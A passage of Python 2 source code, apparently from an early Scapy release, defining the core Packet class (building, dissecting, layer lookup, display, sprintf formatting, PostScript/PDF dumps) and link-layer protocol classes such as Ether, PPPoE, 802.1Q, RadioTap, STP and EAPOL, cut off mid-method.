            self.default_fields[f.name] = f.default
            self.fieldtype[f.name] = f
            if f.holds_packets:
                self.packetfields.append(f)

    def dissection_done(self,pkt):
        """DEV: will be called after a dissection is completed"""
        self.post_dissection(pkt)
        self.payload.dissection_done(pkt)

    def post_dissection(self, pkt):
        """DEV: is called after the dissection of the whole packet"""
        pass

    def get_field(self, fld):
        """DEV: returns the field instance from the name of the field"""
        return self.fieldtype[fld]

    def add_payload(self, payload):
        if payload is None:
            return
        elif not isinstance(self.payload, NoPayload):
            self.payload.add_payload(payload)
        else:
            if isinstance(payload, Packet):
                self.__dict__["payload"] = payload
                payload.add_underlayer(self)
                for t in self.aliastypes:
                    if payload.overload_fields.has_key(t):
                        self.overloaded_fields = payload.overload_fields[t]
                        break
            elif type(payload) is str:
                self.__dict__["payload"] = Raw(load=payload)
            else:
                raise TypeError("payload must be either 'Packet' or 'str', not [%s]" % repr(payload))
    def remove_payload(self):
        self.payload.remove_underlayer(self)
        self.__dict__["payload"] = NoPayload()
        self.overloaded_fields = {}
    def add_underlayer(self, underlayer):
        self.underlayer = underlayer
    def remove_underlayer(self,other):
        self.underlayer = None
    def copy(self):
        """Returns a deep copy of the instance."""
        clone = self.__class__()
        clone.fields = self.fields.copy()
        for k in clone.fields:
            clone.fields[k]=self.get_field(k).do_copy(clone.fields[k])
        clone.default_fields = self.default_fields.copy()
        clone.overloaded_fields = self.overloaded_fields.copy()
        clone.overload_fields = self.overload_fields.copy()
        clone.underlayer=self.underlayer
        clone.explicit=self.explicit
        clone.post_transforms=self.post_transforms[:]
        clone.__dict__["payload"] = self.payload.copy()
        clone.payload.add_underlayer(clone)
        return clone

    def getfieldval(self, attr):
        if attr in self.fields:
            return self.fields[attr]
        if attr in self.overloaded_fields:
            return self.overloaded_fields[attr]
        if attr in self.default_fields:
            return self.default_fields[attr]
        return self.payload.getfieldval(attr)

    def getfield_and_val(self, attr):
        if attr in self.fields:
            return self.get_field(attr),self.fields[attr]
        if attr in self.overloaded_fields:
            return self.get_field(attr),self.overloaded_fields[attr]
        if attr in self.default_fields:
            return self.get_field(attr),self.default_fields[attr]
        return self.payload.getfield_and_val(attr)

    def __getattr__(self, attr):
        if self.initialized:
            fld,v = self.getfield_and_val(attr)
            if fld is not None:
                return fld.i2h(self, v)
            return v
        raise AttributeError(attr)

    def __setattr__(self, attr, val):
        if self.initialized:
            if self.default_fields.has_key(attr):
                fld = self.get_field(attr)
                if fld is None:
                    any2i = lambda x,y: y
                else:
                    any2i = fld.any2i
                self.fields[attr] = any2i(self, val)
                self.explicit=0
            elif attr == "payload":
                self.remove_payload()
                self.add_payload(val)
            else:
                self.__dict__[attr] = val
        else:
            self.__dict__[attr] = val
    def __delattr__(self, attr):
        if self.initialized:
            if self.fields.has_key(attr):
                del(self.fields[attr])
                self.explicit=0 # in case a default value must be explicited
                return
            elif self.default_fields.has_key(attr):
                return
            elif attr == "payload":
                self.remove_payload()
                return
        if self.__dict__.has_key(attr):
            del(self.__dict__[attr])
        else:
            raise AttributeError(attr)

    def __repr__(self):
        s = ""
        ct = conf.color_theme
        for f in self.fields_desc:
            if f.name in self.fields:
                val = f.i2repr(self, self.fields[f.name])
            elif f.name in self.overloaded_fields:
                val =  f.i2repr(self, self.overloaded_fields[f.name])
            else:
                continue
            if isinstance(f, Emph):
                ncol = ct.emph_field_name
                vcol = ct.emph_field_value
            else:
                ncol = ct.field_name
                vcol = ct.field_value


            s += " %s%s%s" % (ncol(f.name),
                              ct.punct("="),
                              vcol(val))
        return "%s%s %s %s%s%s"% (ct.punct("<"),
                                  ct.layer_name(self.__class__.__name__),
                                  s,
                                  ct.punct("|"),
                                  repr(self.payload),
                                  ct.punct(">"))
    def __str__(self):
        return self.build()
    def __div__(self, other):
        if isinstance(other, Packet):
            cloneA = self.copy()
            cloneB = other.copy()
            cloneA.add_payload(cloneB)
            return cloneA
        elif type(other) is str:
            return self/Raw(load=other)
        else:
            return other.__rdiv__(self)
    def __rdiv__(self, other):
        if type(other) is str:
            return Raw(load=other)/self
        else:
            raise TypeError
    def __mul__(self, other):
        if type(other) is int:
            return  [self]*other
        else:
            raise TypeError
    def __rmul__(self,other):
        return self.__mul__(other)

    def __nonzero__(self):
        return True
    def __len__(self):
        return len(self.__str__())
    def do_build(self):
        p=""
        for f in self.fields_desc:
            p = f.addfield(self, p, self.getfieldval(f.name))
        return p

    def post_build(self, pkt, pay):
        """DEV: called right after the current layer is build."""
        return pkt+pay

    def build_payload(self):
        return self.payload.build(internal=1)

    def build(self,internal=0):
        if not self.explicit:
            self = self.__iter__().next()
        pkt = self.do_build()
        for t in self.post_transforms:
            pkt = t(pkt)
        pay = self.build_payload()
        try:
            p = self.post_build(pkt,pay)
        except TypeError:
            log_runtime.error("API changed! post_build() now takes 2 arguments. Compatibility is only assured for a short transition time")
            p = self.post_build(pkt+pay)
        if not internal:
            pad = self.payload.getlayer(Padding)
            if pad:
                p += pad.build()
            p = self.build_done(p)
        return p

    def build_done(self, p):
        return self.payload.build_done(p)

    def do_build_ps(self):
        p=""
        pl = []
        q=""
        for f in self.fields_desc:
            p = f.addfield(self, p, self.getfieldval(f.name) )
            if type(p) is str:
                r = p[len(q):]
                q = p
            else:
                r = ""
            pl.append( (f, f.i2repr(self,self.getfieldval(f.name)), r) )

        pkt,lst = self.payload.build_ps(internal=1)
        p += pkt
        lst.append( (self, pl) )

        return p,lst

    def build_ps(self,internal=0):
        p,lst = self.do_build_ps()
#        if not internal:
#            pkt = self
#            while pkt.haslayer(Padding):
#                pkt = pkt.getlayer(Padding)
#                lst.append( (pkt, [ ("loakjkjd", pkt.load, pkt.load) ] ) )
#                p += pkt.load
#                pkt = pkt.payload
        return p,lst


    def psdump(self, filename=None, **kargs):
        """psdump(filename=None, layer_shift=0, rebuild=1)
Creates an EPS file describing a packet. If filename is not provided a temporary file is created and gs is called."""
        canvas = self.canvas_dump(**kargs)
        if filename is None:
            fname = "/tmp/scapy.%i"%os.getpid()
            canvas.writeEPSfile(fname)
            os.system("%s '%s.eps' &" % (conf.prog.psreader,fname))
        else:
            canvas.writeEPSfile(filename)

    def pdfdump(self, filename=None, **kargs):
        """pdfdump(filename=None, layer_shift=0, rebuild=1)
        Creates a PDF file describing a packet. If filename is not provided a temporary file is created and xpdf is called."""
        canvas = self.canvas_dump(**kargs)
        if filename is None:
            fname = "/tmp/scapy.%i"%os.getpid()
            canvas.writePDFfile(fname)
            os.system("%s '%s.pdf' &" % (conf.prog.pdfreader,fname))
        else:
            canvas.writePDFfile(filename)


    def canvas_dump(self, layer_shift=0, rebuild=1):
        canvas = pyx.canvas.canvas()
        if rebuild:
            p,t = self.__class__(str(self)).build_ps()
        else:
            p,t = self.build_ps()
        YTXT=len(t)
        for n,l in t:
            YTXT += len(l)
        YTXT = float(YTXT)
        YDUMP=YTXT

        XSTART = 1
        XDSTART = 10
        y = 0.0
        yd = 0.0
        xd = 0
        XMUL= 0.55
        YMUL = 0.4

        backcolor=colgen(0.6, 0.8, 1.0, trans=pyx.color.rgb)
        forecolor=colgen(0.2, 0.5, 0.8, trans=pyx.color.rgb)
#        backcolor=makecol(0.376, 0.729, 0.525, 1.0)


        def hexstr(x):
            s = []
            for c in x:
                s.append("%02x" % ord(c))
            return " ".join(s)


        def make_dump_txt(x,y,txt):
            return pyx.text.text(XDSTART+x*XMUL, (YDUMP-y)*YMUL, r"\tt{%s}"%hexstr(txt), [pyx.text.size.Large])

        def make_box(o):
            return pyx.box.rect(o.left(), o.bottom(), o.width(), o.height(), relcenter=(0.5,0.5))

        def make_frame(lst):
            if len(lst) == 1:
                b = lst[0].bbox()
                b.enlarge(pyx.unit.u_pt)
                return b.path()
            else:
                fb = lst[0].bbox()
                fb.enlarge(pyx.unit.u_pt)
                lb = lst[-1].bbox()
                lb.enlarge(pyx.unit.u_pt)
                if len(lst) == 2 and fb.left() > lb.right():
                    return pyx.path.path(pyx.path.moveto(fb.right(), fb.top()),
                                         pyx.path.lineto(fb.left(), fb.top()),
                                         pyx.path.lineto(fb.left(), fb.bottom()),
                                         pyx.path.lineto(fb.right(), fb.bottom()),
                                         pyx.path.moveto(lb.left(), lb.top()),
                                         pyx.path.lineto(lb.right(), lb.top()),
                                         pyx.path.lineto(lb.right(), lb.bottom()),
                                         pyx.path.lineto(lb.left(), lb.bottom()))
                else:
                    # XXX
                    gb = lst[1].bbox()
                    if gb != lb:
                        gb.enlarge(pyx.unit.u_pt)
                    kb = lst[-2].bbox()
                    if kb != gb and kb != lb:
                        kb.enlarge(pyx.unit.u_pt)
                    return pyx.path.path(pyx.path.moveto(fb.left(), fb.top()),
                                         pyx.path.lineto(fb.right(), fb.top()),
                                         pyx.path.lineto(fb.right(), kb.bottom()),
                                         pyx.path.lineto(lb.right(), kb.bottom()),
                                         pyx.path.lineto(lb.right(), lb.bottom()),
                                         pyx.path.lineto(lb.left(), lb.bottom()),
                                         pyx.path.lineto(lb.left(), gb.top()),
                                         pyx.path.lineto(fb.left(), gb.top()),
                                         pyx.path.closepath(),)


        def make_dump(s, shift=0, y=0, col=None, bkcol=None, larg=16):
            c = pyx.canvas.canvas()
            tlist = []
            while s:
                dmp,s = s[:larg-shift],s[larg-shift:]
                txt = make_dump_txt(shift, y, dmp)
                tlist.append(txt)
                shift += len(dmp)
                if shift >= 16:
                    shift = 0
                    y += 1
            if col is None:
                col = pyx.color.rgb.red
            if bkcol is None:
                col = pyx.color.rgb.white
            c.stroke(make_frame(tlist),[col,pyx.deco.filled([bkcol]),pyx.style.linewidth.Thick])
            for txt in tlist:
                c.insert(txt)
            return c, tlist[-1].bbox(), shift, y


        last_shift,last_y=0,0.0
        while t:
            bkcol = backcolor.next()
            proto,fields = t.pop()
            y += 0.5
            pt = pyx.text.text(XSTART, (YTXT-y)*YMUL, r"\font\cmssfont=cmss10\cmssfont{%s}" % proto.name, [ pyx.text.size.Large])
            y += 1
            ptbb=pt.bbox()
            ptbb.enlarge(pyx.unit.u_pt*2)
            canvas.stroke(ptbb.path(),[pyx.color.rgb.black, pyx.deco.filled([bkcol])])
            canvas.insert(pt)
            for fname, fval, fdump in fields:
                col = forecolor.next()
                ft = pyx.text.text(XSTART, (YTXT-y)*YMUL, r"\font\cmssfont=cmss10\cmssfont{%s}" % tex_escape(fname.name))
                if fval is not None:
                    if len(fval) > 18:
                        fval = fval[:18]+"[...]"
                else:
                    fval=""
                vt = pyx.text.text(XSTART+3, (YTXT-y)*YMUL, r"\font\cmssfont=cmss10\cmssfont{%s}" % tex_escape(fval))
                y += 1.0
                if fdump:
                    dt,target,last_shift,last_y = make_dump(fdump, last_shift, last_y, col, bkcol)

                    dtb = dt.bbox()
                    dtb=target
                    vtb = vt.bbox()
                    bxvt = make_box(vtb)
                    bxdt = make_box(dtb)
                    dtb.enlarge(pyx.unit.u_pt)
                    try:
                        if yd < 0:
                            cnx = pyx.connector.curve(bxvt,bxdt,absangle1=0, absangle2=-90)
                        else:
                            cnx = pyx.connector.curve(bxvt,bxdt,absangle1=0, absangle2=90)
                    except:
                        pass
                    else:
                        canvas.stroke(cnx,[pyx.style.linewidth.thin,pyx.deco.earrow.small,col])

                    canvas.insert(dt)

                canvas.insert(ft)
                canvas.insert(vt)
            last_y += layer_shift

        return canvas



    def extract_padding(self, s):
        """DEV: to be overloaded to extract current layer's padding. Return a couple of strings (actual layer, padding)"""
        return s,None

    def post_dissect(self, s):
        """DEV: is called right after the current layer has been dissected"""
        return s

    def pre_dissect(self, s):
        """DEV: is called right before the current layer is dissected"""
        return s

    def do_dissect(self, s):
        flist = self.fields_desc[:]
        flist.reverse()
        while s and flist:
            f = flist.pop()
            s,fval = f.getfield(self, s)
            self.fields[f.name] = fval

        return s

    def do_dissect_payload(self, s):
        if s:
            cls = self.guess_payload_class(s)
            try:
                p = cls(s, _internal=1, _underlayer=self)
            except KeyboardInterrupt:
                raise
            except:
                if conf.debug_dissector:
                    if isinstance(cls,type) and issubclass(cls,Packet):
                        log_runtime.error("%s dissector failed" % cls.name)
                    else:
                        log_runtime.error("%s.guess_payload_class() returned [%s]" % (self.__class__.__name__,repr(cls)))
                    if cls is not None:
                        raise
                p = Raw(s, _internal=1, _underlayer=self)
            self.add_payload(p)

    def dissect(self, s):
        s = self.pre_dissect(s)

        s = self.do_dissect(s)

        s = self.post_dissect(s)

        payl,pad = self.extract_padding(s)
        self.do_dissect_payload(payl)
        if pad and conf.padding:
            self.add_payload(Padding(pad))


    def guess_payload_class(self, payload):
        """DEV: Guesses the next payload class from layer bonds. Can be overloaded to use a different mechanism."""
        for t in self.aliastypes:
            for fval, cls in t.payload_guess:
                ok = 1
                for k in fval.keys():
                    if not hasattr(self, k) or fval[k] != self.getfieldval(k):
                        ok = 0
                        break
                if ok:
                    return cls
        return self.default_payload_class(payload)

    def default_payload_class(self, payload):
        """DEV: Returns the default payload class if nothing has been found by the guess_payload_class() method."""
        return Raw

    def hide_defaults(self):
        """Removes fields' values that are the same as default values."""
        for k in self.fields.keys():
            if self.default_fields.has_key(k):
                if self.default_fields[k] == self.fields[k]:
                    del(self.fields[k])
        self.payload.hide_defaults()


    def __iter__(self):
        def loop(todo, done, self=self):
            if todo:
                eltname = todo.pop()
                elt = self.getfieldval(eltname)
                if not isinstance(elt, Gen):
                    if self.get_field(eltname).islist:
                        elt = SetGen([elt])
                    else:
                        elt = SetGen(elt)
                for e in elt:
                    done[eltname]=e
                    for x in loop(todo[:], done):
                        yield x
            else:
                if isinstance(self.payload,NoPayload):
                    payloads = [None]
                else:
                    payloads = self.payload
                for payl in payloads:
                    done2=done.copy()
                    for k in done2:
                        if isinstance(done2[k], VolatileValue):
                            done2[k] = done2[k]._fix()
                    pkt = self.__class__()
                    pkt.explicit = 1
                    pkt.fields = done2
                    pkt.time = self.time
                    pkt.underlayer = self.underlayer
                    pkt.overload_fields = self.overload_fields.copy()
                    pkt.post_transforms = self.post_transforms
                    if payl is not None:
                        pkt.add_payload(payl)
                    yield pkt

        if self.explicit:
            todo = []
            done = self.fields
        else:
            todo = [ k for (k,v) in itertools.chain(self.default_fields.iteritems(),
                                                    self.overloaded_fields.iteritems())
                     if isinstance(v, VolatileValue) ] + self.fields.keys()
            done = {}
        return loop(todo, done)

    def __gt__(self, other):
        """True if other is an answer from self (self ==> other)."""
        if isinstance(other, Packet):
            return other < self
        elif type(other) is str:
            return 1
        else:
            raise TypeError((self, other))
    def __lt__(self, other):
        """True if self is an answer from other (other ==> self)."""
        if isinstance(other, Packet):
            return self.answers(other)
        elif type(other) is str:
            return 1
        else:
            raise TypeError((self, other))

    def __eq__(self, other):
        if not isinstance(other, self.__class__):
            return False
        for f in self.fields_desc:
            if f not in other.fields_desc:
                return False
            if self.getfieldval(f.name) != other.getfieldval(f.name):
                return False
        return self.payload == other.payload

    def __ne__(self, other):
        return not self.__eq__(other)

    def hashret(self):
        """DEV: returns a string that has the same value for a request and its answer."""
        return self.payload.hashret()
    def answers(self, other):
        """DEV: true if self is an answer from other"""
        if other.__class__ == self.__class__:
            return self.payload.answers(other.payload)
        return 0

    def haslayer(self, cls):
        """true if self has a layer that is an instance of cls. Superseded by "cls in self" syntax."""
        if self.__class__ == cls or self.__class__.__name__ == cls:
            return 1
        for f in self.packetfields:
            fvalue_gen = self.getfieldval(f.name)
            if fvalue_gen is None:
                continue
            if not f.islist:
                fvalue_gen = SetGen(fvalue_gen,_iterpacket=0)
            for fvalue in fvalue_gen:
                if isinstance(fvalue, Packet):
                    ret = fvalue.haslayer(cls)
                    if ret:
                        return ret
        return self.payload.haslayer(cls)
    def getlayer(self, cls, nb=1, _track=None):
        """Return the nb^th layer that is an instance of cls."""
        if type(cls) is str and "." in cls:
            ccls,fld = cls.split(".",1)
        else:
            ccls,fld = cls,None
        if self.__class__ == cls or self.__class__.name == ccls:
            if nb == 1:
                if fld is None:
                    return self
                else:
                    return self.getfieldval(fld)
            else:
                nb -=1
        for f in self.packetfields:
            fvalue_gen = self.getfieldval(f.name)
            if fvalue_gen is None:
                continue
            if not f.islist:
                fvalue_gen = SetGen(fvalue_gen,_iterpacket=0)
            for fvalue in fvalue_gen:
                if isinstance(fvalue, Packet):
                    track=[]
                    ret = fvalue.getlayer(cls, nb, _track=track)
                    if ret is not None:
                        return ret
                    nb = track[0]
        return self.payload.getlayer(cls,nb,_track=_track)

    def __getitem__(self, cls):
        if type(cls) is slice:
            if cls.stop:
                ret = self.getlayer(cls.start, cls.stop)
            else:
                ret = self.getlayer(cls.start)
            if ret is None and cls.step is not None:
                ret = cls.step
            return ret
        else:
            return self.getlayer(cls)

    def __contains__(self, cls):
        """"cls in self" returns true if self has a layer which is an instance of cls."""
        return self.haslayer(cls)



    def display(self,*args,**kargs):  # Deprecated. Use show()
        """Deprecated. Use show() method."""
        self.show(*args,**kargs)
    def show(self, indent=3, lvl="", label_lvl=""):
        """Prints a hierarchical view of the packet. "indent" gives the size of indentation for each layer."""
        ct = conf.color_theme
        print "%s%s %s %s" % (label_lvl,
                              ct.punct("###["),
                              ct.layer_name(self.name),
                              ct.punct("]###"))
        for f in self.fields_desc:
            if isinstance(f, Emph):
                ncol = ct.emph_field_name
                vcol = ct.emph_field_value
            else:
                ncol = ct.field_name
                vcol = ct.field_value
            fvalue = self.getfieldval(f.name)
            if isinstance(fvalue, Packet) or (f.islist and f.holds_packets and type(fvalue) is list):
                print "%s  \\%-10s\\" % (label_lvl+lvl, ncol(f.name))
                fvalue_gen = SetGen(fvalue,_iterpacket=0)
                for fvalue in fvalue_gen:
                    fvalue.show(indent=indent, label_lvl=label_lvl+lvl+"   |")
            else:
                print "%s  %-10s%s %s" % (label_lvl+lvl,
                                          ncol(f.name),
                                          ct.punct("="),
                                          vcol(f.i2repr(self,fvalue)))
        self.payload.show(indent=indent, lvl=lvl+(" "*indent*self.show_indent), label_lvl=label_lvl)
    def show2(self):
        """Prints a hierarchical view of an assembled version of the packet, so that automatic fields are calculated (checksums, etc.)"""
        self.__class__(str(self)).show()

    def sprintf(self, fmt, relax=1):
        """sprintf(format, [relax=1]) -> str
where format is a string that can include directives. A directive begins and
ends by % and has the following format %[fmt[r],][cls[:nb].]field%.

fmt is a classic printf directive, "r" can be appended for raw substitution
(ex: IP.flags=0x18 instead of SA), nb is the number of the layer we want
(ex: for IP/IP packets, IP:2.src is the src of the upper IP layer).
Special case : "%.time%" is the creation time.
Ex : p.sprintf("%.time% %-15s,IP.src% -> %-15s,IP.dst% %IP.chksum% "
               "%03xr,IP.proto% %r,TCP.flags%")

Moreover, the format string can include conditionnal statements. A conditionnal
statement looks like : {layer:string} where layer is a layer name, and string
is the string to insert in place of the condition if it is true, i.e. if layer
is present. If layer is preceded by a "!", the result si inverted. Conditions
can be imbricated. A valid statement can be :
  p.sprintf("This is a{TCP: TCP}{UDP: UDP}{ICMP:n ICMP} packet")
  p.sprintf("{IP:%IP.dst% {ICMP:%ICMP.type%}{TCP:%TCP.dport%}}")

A side effect is that, to obtain "{" and "}" characters, you must use
"%(" and "%)".
"""

        escape = { "%": "%",
                   "(": "{",
                   ")": "}" }


        # Evaluate conditions
        while "{" in fmt:
            i = fmt.rindex("{")
            j = fmt[i+1:].index("}")
            cond = fmt[i+1:i+j+1]
            k = cond.find(":")
            if k < 0:
                raise Scapy_Exception("Bad condition in format string: [%s] (read sprintf doc!)"%cond)
            cond,format = cond[:k],cond[k+1:]
            res = False
            if cond[0] == "!":
                res = True
                cond = cond[1:]
            if self.haslayer(cond):
                res = not res
            if not res:
                format = ""
            fmt = fmt[:i]+format+fmt[i+j+2:]

        # Evaluate directives
        s = ""
        while "%" in fmt:
            i = fmt.index("%")
            s += fmt[:i]
            fmt = fmt[i+1:]
            if fmt and fmt[0] in escape:
                s += escape[fmt[0]]
                fmt = fmt[1:]
                continue
            try:
                i = fmt.index("%")
                sfclsfld = fmt[:i]
                fclsfld = sfclsfld.split(",")
                if len(fclsfld) == 1:
                    f = "s"
                    clsfld = fclsfld[0]
                elif len(fclsfld) == 2:
                    f,clsfld = fclsfld
                else:
                    raise Scapy_Exception
                if "." in clsfld:
                    cls,fld = clsfld.split(".")
                else:
                    cls = self.__class__.__name__
                    fld = clsfld
                num = 1
                if ":" in cls:
                    cls,num = cls.split(":")
                    num = int(num)
                fmt = fmt[i+1:]
            except:
                raise Scapy_Exception("Bad format string [%%%s%s]" % (fmt[:25], fmt[25:] and "..."))
            else:
                if fld == "time":
                    val = time.strftime("%H:%M:%S.%%06i", time.localtime(self.time)) % int((self.time-int(self.time))*1000000)
                elif cls == self.__class__.__name__ and hasattr(self, fld):
                    if num > 1:
                        val = self.payload.sprintf("%%%s,%s:%s.%s%%" % (f,cls,num-1,fld), relax)
                        f = "s"
                    elif f[-1] == "r":  # Raw field value
                        val = getattr(self,fld)
                        f = f[:-1]
                        if not f:
                            f = "s"
                    else:
                        val = getattr(self,fld)
                        if fld in self.fieldtype:
                            val = self.fieldtype[fld].i2repr(self,val)
                else:
                    val = self.payload.sprintf("%%%s%%" % sfclsfld, relax)
                    f = "s"
                s += ("%"+f) % val

        s += fmt
        return s

    def mysummary(self):
        """DEV: can be overloaded to return a string that summarizes the layer.
           Only one mysummary() is used in a whole packet summary: the one of the upper layer,
           except if a mysummary() also returns (as a couple) a list of layers whose
           mysummary() must be called if they are present."""
        return ""

    def summary(self, intern=0):
        """Prints a one line summary of a packet."""
        found,s,needed = self.payload.summary(intern=1)
        if s:
            s = " / "+s
        ret = ""
        if not found or self.__class__ in needed:
            ret = self.mysummary()
            if type(ret) is tuple:
                ret,n = ret
                needed += n
        if ret or needed:
            found = 1
        if not ret:
            ret = self.__class__.__name__
        ret = "%s%s" % (ret,s)
        if intern:
            return found,ret,needed
        else:
            return ret

    def lastlayer(self,layer=None):
        """Returns the uppest layer of the packet"""
        return self.payload.lastlayer(self)

    def decode_payload_as(self,cls):
        """Reassembles the payload and decode it using another packet class"""
        s = str(self.payload)
        self.payload = cls(s)

    def libnet(self):
        """Not ready yet. Should give the necessary C code that interfaces with libnet to recreate the packet"""
        print "libnet_build_%s(" % self.__class__.name.lower()
        det = self.__class__(str(self))
        for f in self.fields_desc:
            val = det.getfieldval(f.name)
            if val is None:
                val = 0
            elif type(val) is int:
                val = str(val)
            else:
                val = '"%s"' % str(val)
            print "\t%s, \t\t/* %s */" % (val,f.name)
        print ");"
    def command(self):
        """Returns a string representing the command you have to type to obtain the same packet"""
        f = []
        for fn,fv in self.fields.items():
            fld = self.get_field(fn)
            if isinstance(fv, Packet):
                fv = fv.command()
            elif fld.islist and fld.holds_packets and type(fv) is list:
                fv = "[%s]" % ",".join( map(Packet.command, fv))
            else:
                fv = repr(fv)
            f.append("%s=%s" % (fn, fv))
        c = "%s(%s)" % (self.__class__.__name__, ", ".join(f))
        pc = self.payload.command()
        if pc:
            c += "/"+pc
        return c


class ASN1_Packet(Packet):
    ASN1_root = None
    ASN1_codec = None
    def init_fields(self):
        flist = self.ASN1_root.get_fields_list()
        self.do_init_fields(flist)
        self.fields_desc = flist
    def do_build(self):
        return self.ASN1_root.build(self)
    def do_dissect(self, x):
        return self.ASN1_root.dissect(self, x)


class NoPayload(Packet,object):
    def __new__(cls, *args, **kargs):
        singl = cls.__dict__.get("__singl__")
        if singl is None:
            cls.__singl__ = singl = object.__new__(cls)
            Packet.__init__(singl, *args, **kargs)
        return singl
    def __init__(self, *args, **kargs):
        pass
    def dissection_done(self,pkt):
        return
    def add_payload(self, payload):
        raise Scapy_Exception("Can't add payload to NoPayload instance")
    def remove_payload(self):
        pass
    def add_underlayer(self,underlayer):
        pass
    def remove_underlayer(self,other):
        pass
    def copy(self):
        return self
    def __repr__(self):
        return ""
    def __str__(self):
        return ""
    def __nonzero__(self):
        return False
    def build(self, internal=0):
        return ""
    def build_done(self, p):
        return p
    def build_ps(self, internal=0):
        return "",[]
    def getfieldval(self, attr):
        raise AttributeError(attr)
    def getfield_and_val(self, attr):
        raise AttributeError(attr)
    def __getattr__(self, attr):
        if attr in self.__dict__:
            return self.__dict__[attr]
        elif attr in self.__class__.__dict__:
            return self.__class__.__dict__[attr]
        else:
            raise AttributeError, attr
    def hide_defaults(self):
        pass
    def __iter__(self):
        return iter([])
    def __eq__(self, other):
        if isinstance(other, NoPayload):
            return True
        return False
    def hashret(self):
        return ""
    def answers(self, other):
        return isinstance(other, NoPayload) or isinstance(other, Padding)
    def haslayer(self, cls):
        return 0
    def getlayer(self, cls, nb=1, _track=None):
        if _track is not None:
            _track.append(nb)
        return None
    def show(self, indent=3, lvl="", label_lvl=""):
        pass
    def sprintf(self, fmt, relax):
        if relax:
            return "??"
        else:
            raise Scapy_Exception("Format not found [%s]"%fmt)
    def summary(self, intern=0):
        return 0,"",[]
    def lastlayer(self,layer):
        return layer
    def command(self):
        return ""


####################
## packet classes ##
####################


class Raw(Packet):
    name = "Raw"
    fields_desc = [ StrField("load", "") ]
    def answers(self, other):
        return 1
#        s = str(other)
#        t = self.load
#        l = min(len(s), len(t))
#        return  s[:l] == t[:l]

class Padding(Raw):
    name = "Padding"
    def build(self, internal=0):
        if internal:
            return ""
        else:
            return Raw.build(self)

class Ether(Packet):
    name = "Ethernet"
    fields_desc = [ DestMACField("dst"),
                    SourceMACField("src"),
                    XShortEnumField("type", 0x0000, ETHER_TYPES) ]
    def hashret(self):
        return struct.pack("H",self.type)+self.payload.hashret()
    def answers(self, other):
        if isinstance(other,Ether):
            if self.type == other.type:
                return self.payload.answers(other.payload)
        return 0
    def mysummary(self):
        return self.sprintf("%src% > %dst% (%type%)")

class PPPoE(Packet):
    name = "PPP over Ethernet"
    fields_desc = [ BitField("version", 1, 4),
                    BitField("type", 1, 4),
                    ByteEnumField("code", 0, {0:"Session"}),
                    XShortField("sessionid", 0x0),
                    ShortField("len", None) ]

    def post_build(self, p, pay):
        p += pay
        if self.len is None:
            l = len(p)-6
            p = p[:4]+struct.pack("!H", l)+p[6:]
        return p

class PPPoED(PPPoE):
    name = "PPP over Ethernet Discovery"
    fields_desc = [ BitField("version", 1, 4),
                    BitField("type", 1, 4),
                    ByteEnumField("code", 0x09, {0x09:"PADI",0x07:"PADO",0x19:"PADR",0x65:"PADS",0xa7:"PADT"}),
                    XShortField("sessionid", 0x0),
                    ShortField("len", None) ]

class Dot3(Packet):
    name = "802.3"
    fields_desc = [ MACField("dst", ETHER_BROADCAST),
                    MACField("src", ETHER_ANY),
                    LenField("len", None, "H") ]
    def extract_padding(self,s):
        l = self.len
        return s[:l],s[l:]
    def answers(self, other):
        if isinstance(other,Dot3):
            return self.payload.answers(other.payload)
        return 0
    def mysummary(self):
        return "802.3 %s > %s" % (self.src, self.dst)


class LLC(Packet):
    name = "LLC"
    fields_desc = [ XByteField("dsap", 0x00),
                    XByteField("ssap", 0x00),
                    ByteField("ctrl", 0) ]


class CookedLinux(Packet):
    name = "cooked linux"
    fields_desc = [ ShortEnumField("pkttype",0, {0: "unicast",
                                                 4:"sent-by-us"}), #XXX incomplete
                    XShortField("lladdrtype",512),
                    ShortField("lladdrlen",0),
                    StrFixedLenField("src","",8),
                    XShortEnumField("proto",0x800,ETHER_TYPES) ]



class SNAP(Packet):
    name = "SNAP"
    fields_desc = [ X3BytesField("OUI",0x000000),
                    XShortEnumField("code", 0x000, ETHER_TYPES) ]


class Dot1Q(Packet):
    name = "802.1Q"
    aliastypes = [ Ether ]
    fields_desc =  [ BitField("prio", 0, 3),
                     BitField("id", 0, 1),
                     BitField("vlan", 1, 12),
                     XShortEnumField("type", 0x0000, ETHER_TYPES) ]
    def answers(self, other):
        if isinstance(other,Dot1Q):
            if ( (self.type == other.type) and
                 (self.vlan == other.vlan) ):
                return self.payload.answers(other.payload)
        else:
            return self.payload.answers(other)
        return 0
    def default_payload_class(self, pay):
        if self.type <= 1500:
            return LLC
        return Raw
    def extract_padding(self,s):
        if self.type <= 1500:
            return s[:self.type],s[self.type:]
        return s,None
    def mysummary(self):
        if isinstance(self.underlayer, Ether):
            return self.underlayer.sprintf("802.1q %Ether.src% > %Ether.dst% (%Dot1Q.type%) vlan %Dot1Q.vlan%")
        else:
            return self.sprintf("802.1q (%Dot1Q.type%) vlan %Dot1Q.vlan%")




class RadioTap(Packet):
    name = "RadioTap dummy"
    fields_desc = [ ByteField('version', 0),
                    ByteField('pad', 0),
                    FieldLenField('len', None, 'notdecoded', '@H', adjust=lambda pkt,x:x+8),
                    FlagsField('present', None, -32, ['TSFT','Flags','Rate','Channel','FHSS','dBm_AntSignal',
                                                     'dBm_AntNoise','Lock_Quality','TX_Attenuation','dB_TX_Attenuation',
                                                      'dBm_TX_Power', 'Antenna', 'dB_AntSignal', 'dB_AntNoise',
                                                     'b14', 'b15','b16','b17','b18','b19','b20','b21','b22','b23',
                                                     'b24','b25','b26','b27','b28','b29','b30','Ext']),
                    StrLenField('notdecoded', "", length_from= lambda pkt:pkt.len-8) ]

class STP(Packet):
    name = "Spanning Tree Protocol"
    fields_desc = [ ShortField("proto", 0),
                    ByteField("version", 0),
                    ByteField("bpdutype", 0),
                    ByteField("bpduflags", 0),
                    ShortField("rootid", 0),
                    MACField("rootmac", ETHER_ANY),
                    IntField("pathcost", 0),
                    ShortField("bridgeid", 0),
                    MACField("bridgemac", ETHER_ANY),
                    ShortField("portid", 0),
                    BCDFloatField("age", 1),
                    BCDFloatField("maxage", 20),
                    BCDFloatField("hellotime", 2),
                    BCDFloatField("fwddelay", 15) ]


class EAPOL(Packet):
    name = "EAPOL"
    fields_desc = [ ByteField("version", 1),
                    ByteEnumField("type", 0, ["EAP_PACKET", "START", "LOGOFF", "KEY", "ASF"]),
                    LenField("len", None, "H") ]

    EAP_PACKET= 0
    START = 1
    LOGOFF = 2
    KEY = 3
    ASF = 4
    def extract_padding(self, s):
        l = self.len
        return s[:l],s[l:]
    def hashret(self):
